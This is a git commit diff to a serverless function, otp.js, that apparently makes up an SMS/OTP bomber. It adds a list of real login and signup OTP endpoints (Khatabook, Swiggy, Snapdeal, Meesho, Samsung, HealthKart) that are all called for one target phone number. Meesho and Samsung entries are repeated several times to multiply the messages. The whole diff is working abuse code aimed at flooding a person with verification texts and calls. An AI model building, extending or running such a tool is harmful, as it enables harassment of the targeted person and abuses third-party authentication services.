61418533059c59de5a6939e6d62d7834bbad9ff5
passmannger <passmannager@gmail.com>
2025-07-20 14:58:51 +0530

    Update otp.js

--- functions/otp.js
+++ functions/otp.js
@@ -28,29 +28,189 @@ exports.handler = async (event) => {
 
   // ✅ Define all APIs here
   const apis = [
-    makeApi({
-      name: "khatabook",
-      url: "https://api.khatabook.com/v1/auth/request-otp",
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      getBody: (phone) =>
-        JSON.stringify({
-          app_signature: "Jc/Zu7qNqQ2",
-          country_code: "+91",
-          phone: phone,
-        }),
+  // Khatabook
+  makeApi({
+    name: "khatabook",
+    url: "https://api.khatabook.com/v1/auth/request-otp",
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    getBody: (phone) =>
+      JSON.stringify({
+        app_signature: "Jc/Zu7qNqQ2",
+        country_code: "+91",
+        phone: phone,
+      }),
+  }),
+makeApi({
+  name: "swiggy",
+  url: "https://profile.swiggy.com/api/v3/app/request_call_verification",
+  method: "POST",
+  headers: { "Content-Type": "application/json" },
+  getBody: (phone) =>
+    JSON.stringify({
+      mobile: phone,
     }),
-    
-    makeApi({
-      name: "samsung",
-      url: "https://www.samsung.com/in/api/v1/sso/otp/init",
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      getBody: (phone) => JSON.stringify({ user_id: phone }),
+}),
+  // Snapdeal
+  makeApi({
+    name: "snapdeal",
+    url: "https://m.snapdeal.com/sendOTP",
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    getBody: (phone) =>
+      JSON.stringify({
+        mobileNumber: phone,
+        purpose: "LOGIN_WITH_MOBILE_OTP",
+      }),
+  }),
+
+  // Swiggy
+  makeApi({
+    name: "swiggy",
+    url: "https://profile.swiggy.com/api/v3/app/request_call_verification",
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    getBody: (phone) =>
+      JSON.stringify({
+        mobile: phone,
+      }),
+  }),
+  
+  makeApi({
+    name: "meesho_1",
+    url: "https://www.meesho.com/api/v1/user/login/request-otp",
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    getBody: (phone) =>
+      JSON.stringify({
+        phone_number: phone,
+      }),
+  }),
+  makeApi({
+    name: "meesho_2",
+    url: "https://www.meesho.com/api/v1/user/login/request-otp",
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    getBody: (phone) =>
+      JSON.stringify({
+        phone_number: phone,
+      }),
+  }),
+  makeApi({
+    name: "meesho_3",
+    url: "https://www.meesho.com/api/v1/user/login/request-otp",
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    getBody: (phone) =>
+      JSON.stringify({
+        phone_number: phone,
+      }),
+  }),
+makeApi({
+    name: "meesho_4",
+    url: "https://www.meesho.com/api/v1/user/login/request-otp",
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    getBody: (phone) =>
+      JSON.stringify({
+        phone_number: phone,
+      }),
+  }),
+  makeApi({
+    name: "meesho_5",
+    url: "https://www.meesho.com/api/v1/user/login/request-otp",
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    getBody: (phone) =>
+      JSON.stringify({
+        phone_number: phone,
+      }),
+  }),
+  
+  makeApi({
+  name: "samsung",
+  url: "https://www.samsung.com/in/api/v1/sso/otp/init",
+  method: "POST",
+  headers: { "Content-Type": "application/json" },
+  getBody: (phone) =>
+    JSON.stringify({
+      user_id: phone,
     }),
-    // 🆕 Add more APIs here like this 👇
-    // makeApi({ ... })
-  ];
+}),
+
+makeApi({
+  name: "samsung_1",
+  url: "https://www.samsung.com/in/api/v1/sso/otp/init",
+  method: "POST",
+  headers: { "Content-Type": "application/json" },
+  getBody: (phone) =>
+    JSON.stringify({
+      user_id: phone,
+    }),
+}),
+
+makeApi({
+  name: "samsung_2",
+  url: "https://www.samsung.com/in/api/v1/sso/otp/init",
+  method: "POST",
+  headers: { "Content-Type": "application/json" },
+  getBody: (phone) =>
+    JSON.stringify({
+      user_id: phone,
+    }),
+}),
+
+makeApi({
+  name: "samsung_3",
+  url: "https://www.samsung.com/in/api/v1/sso/otp/init",
+  method: "POST",
+  headers: { "Content-Type": "application/json" },
+  getBody: (phone) =>
+    JSON.stringify({
+      user_id: phone,
+    }),
+}),
+
+makeApi({
+  name: "samsung_4",
+  url: "https://www.samsung.com/in/api/v1/sso/otp/init",
+  method: "POST",
+  headers: { "Content-Type": "application/json" },
+  getBody: (phone) =>
+    JSON.stringify({
+      user_id: phone,
+    }),
+}),
+makeApi({
+  name: "samsung_5",
+  url: "https://www.samsung.com/in/api/v1/sso/otp/init",
+  method: "POST",
+  headers: { "Content-Type": "application/json" },
+  getBody: (phone) =>
+    JSON.stringify({
+      user_id: phone,
+    }),
+}),
+  // HealthKart Signup (GET)
+  makeApi({
+    name: "healthkart_signup",
+    url: (phone) =>
+      `https://www.healthkart.com/veronica/user/validate/1/${phone}/signup?plt=2&st=1`,
+    method: "GET",
+    headers: {},
+    getBody: () => null,
+  }),
+
+  // HealthKart Login (GET)
+  makeApi({
+    name: "healthkart_login",
+    url: (phone) =>
+      `https://www.healthkart.com/veronica/user/login/send/otp/1/${phone}?trkSrc=MYA-LPOPUP&forgotPassword=false&plt=2&st=1`,
+    method: "GET",
+    headers: {},
+    getBody: () => null,
+  }),
+];
 
   let results = [];
 
@@ -72,3 +232,5 @@ exports.handler = async (event) => {
     body: JSON.stringify({ phone, results }),
   };
 };
+
+  
